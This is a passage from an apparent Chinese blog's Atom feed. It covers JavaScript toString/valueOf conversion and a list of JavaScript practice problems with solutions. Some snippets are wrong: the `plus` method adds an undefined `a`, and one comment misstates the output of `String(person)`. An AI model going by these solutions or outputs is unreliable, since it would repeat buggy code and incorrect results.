&amp;#123;f(&lt;span class=&quot;name&quot;&gt;x&lt;/span&gt;)&lt;span class=&quot;comment&quot;&gt;;&amp;#125;).toString() // =&amp;gt; &quot;function(x) &amp;#123;\n f(x); \n&amp;#125;&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;new Date(&lt;span class=&quot;name&quot;&gt;2010&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;).toString() // =&amp;gt; &lt;span class=&quot;string&quot;&gt;&quot;Fri Jan 01 2010 00:00:00 GMT-0800 (PST)&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;由于大多数对象都无法直接表示为原始值，所以valueOf()只是简单的返回对象本身，而不是一个原始值。日期类调用valueOf()的话会返回自1970年1月1日以来的毫秒数表示。&lt;br&gt;&lt;figure class=&quot;highlight gauss&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;Date&lt;/span&gt;().valueOf() &lt;span class=&quot;comment&quot;&gt;// =&amp;gt; 1453724534867&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h4 id=&quot;转换步骤&quot;&gt;&lt;a href=&quot;#转换步骤&quot; class=&quot;headerlink&quot; title=&quot;转换步骤&quot;&gt;&lt;/a&gt;转换步骤&lt;/h4&gt;&lt;p&gt;javascript对象转化为字符串的转换步骤为:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;对象调用toString()方法，如果返回的是一个原始值，则将这个原始值转化为字符串返回。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;如果对象没有toString()方法或者返回的值不是原始值的话，那么对象将调用valueOf()&lt;br&gt;。如果这个方法存在的话，那么就调用这个方法。如果返回的是原始值，那么将这个原始值转化为字符串，并返回这个字符串。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;如果上述步骤都无法获得一个原始值的话，那么它将会报出一个类型异常的错误。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;javascript对象转化为数值的转换步骤为:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;如果对象有valueOf()方法，并且这个方法返回一个原始值的话，那么将这个原始值转化为数字返回。 &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;否则，如果对象有toString()方法，那么调用这个方法，如果返回的是一个原始值的话，转换这个原始值为数字并返回。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;否者，抛出一个类型异常错误。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight qml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;var&lt;/span&gt; person = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;attribute&quot;&gt;valueOf&lt;/span&gt;: &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(&lt;span class=&quot;string&quot;&gt;&#39;valueof&#39;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;10&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;attribute&quot;&gt;toString&lt;/span&gt;: &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(&lt;span class=&quot;string&quot;&gt;&#39;toString&#39;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;person&#39;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(+person); &lt;span class=&quot;comment&quot;&gt;// =&amp;gt; &#39;valueof&#39; 10&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(&lt;span class=&quot;built_in&quot;&gt;String&lt;/span&gt;(person)); &lt;span class=&quot;comment&quot;&gt;// =&amp;gt; &#39;toString&#39; 10&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这里存在两种特殊情况:&lt;br&gt;&lt;figure class=&quot;highlight coffeescript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(person + &lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;); &lt;span class=&quot;regexp&quot;&gt;//&lt;/span&gt; =&amp;gt; &lt;span class=&quot;string&quot;&gt;&#39;valueOf&#39;&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;10&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(person == &lt;span class=&quot;string&quot;&gt;&#39;10&#39;&lt;/span&gt;); &lt;span class=&quot;regexp&quot;&gt;//&lt;/span&gt; =&amp;gt; &lt;span class=&quot;string&quot;&gt;&#39;value&#39;&lt;/span&gt; &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;显然上面得出的结果和转化步骤不符，具体原因我将去查证，日后补充。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;javascript中的数值类型转换非常灵活，这要归咎于它是一门弱类型语言，从被一设计出来就对取值类型不敏感。松散的数据类型给js带来了很大的灵活性，但是与之而来的问题也有很多…&lt;br&gt;
    
    </summary>
    
    
      <category term="javascript" scheme="http://summerGreenTea.github.io/tags/javascript/"/>
    
  </entry>
  
  <entry>
    <title>收集的一些有趣的javascript问题</title>
    <link href="http://summerGreenTea.github.io/2016/01/25/javascript-programming-question/"/>
    <id>http://summerGreenTea.github.io/2016/01/25/javascript-programming-question/</id>
    <published>2016-01-25T06:01:25.000Z</published>
    <updated>2016-03-03T14:18:08.913Z</updated>
    
    <content type="html">&lt;p&gt;在网上看到一些不错的javascript编程题，于是我也想拿来练练手。这篇博客也将会不断更新。&lt;br&gt;&lt;img src=&quot;/2016/01/25/javascript-programming-question/jpq.jpg&quot; alt=&quot;jpq.jpg&quot; title=&quot;&quot;&gt;&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;题目与解答&quot;&gt;&lt;a href=&quot;#题目与解答&quot; class=&quot;headerlink&quot; title=&quot;题目与解答&quot;&gt;&lt;/a&gt;题目与解答&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;找出数组中最大的元素(使用Math.max函数)。&lt;/p&gt;
&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; arr = [&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;7&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(&lt;span class=&quot;built_in&quot;&gt;Math&lt;/span&gt;.max.apply(&lt;span class=&quot;literal&quot;&gt;null&lt;/span&gt;, arr)); &lt;span class=&quot;comment&quot;&gt;//7&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;转化一个数字数组为function数组(每个function都弹出相应的数字)。&lt;/p&gt;
&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; numberArray = [&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;6&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;7&lt;/span&gt;], &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	functionArray = [],&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	i = &lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	len = numberArray.length;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt;(++i &amp;lt; len) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	functionArray.push((&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;num&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(num)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;)(numberArray[i]))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;给object数组进行排序(排序对象是每个元素对象的属性个数)。&lt;/p&gt;
&lt;figure class=&quot;highlight hsp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;var i = &lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	len = obj.&lt;span class=&quot;keyword&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;comment&quot;&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;obj.sort(function(prev, &lt;span class=&quot;keyword&quot;&gt;next&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	var prevN = Object.keys(prev).&lt;span class=&quot;keyword&quot;&gt;length&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		nextN = Object.keys(&lt;span class=&quot;keyword&quot;&gt;next&lt;/span&gt;).&lt;span class=&quot;keyword&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;comment&quot;&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; prevN === nextN ? &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; : (prevN &amp;gt; nextN ? &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; : &lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;)&lt;span class=&quot;comment&quot;&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;)&lt;span class=&quot;comment&quot;&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;利用Javascipt打印Fibonacci数(不使用全局变量)。&lt;/p&gt;
&lt;figure class=&quot;highlight delphi&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;fibonacci&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(n)&lt;/span&gt; &lt;span class=&quot;comment&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	var a = [],&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		i = 2,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		j = 0;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	a[0] = 0, a[1] = 1;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	for(; i &amp;lt; n; i++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		a[i] = a[i - 1] + a[i - 2];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;title&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(j &amp;lt; n)&lt;/span&gt; &lt;span class=&quot;comment&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		console.log(a[j]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		j++;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;实现如下语法功能：var a = (5).plus(3).minus(6); //2 。&lt;/p&gt;
&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;Number&lt;/span&gt;.prototype.plus = &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;num&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt; + a;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;Number&lt;/span&gt;.prototype.minus = &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;num&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt; - num;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;实现如下语法的功能：var a = add(2)(3)(4); //9 &lt;/p&gt;
&lt;figure class=&quot;highlight scilab&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(x)&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    var &lt;span class=&quot;built_in&quot;&gt;sum&lt;/span&gt; = x;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    var tmp = &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;(y)&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;sum&lt;/span&gt; = &lt;span class=&quot;built_in&quot;&gt;sum&lt;/span&gt; + y;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; tmp;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    tmp.toString = &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;()&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;sum&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; tmp;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;7.实现将一个多维数组的元素全部都转为一个一维数组&lt;br&gt;&lt;figure class=&quot;highlight hsp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;//这个题目的解答过程非常巧妙&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;//利用数组与字符串相加，然后让数组转化为字符串的方式来得到一个数组中所有元素用逗号连成的字符串&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;var arr = [&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;,[&lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;6&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;7&lt;/span&gt;,[&lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;9&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;10&lt;/span&gt;]]]&lt;span class=&quot;comment&quot;&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;var newArr = (arr + &lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;).&lt;span class=&quot;keyword&quot;&gt;split&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&#39;,&#39;&lt;/span&gt;)&lt;span class=&quot;comment&quot;&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
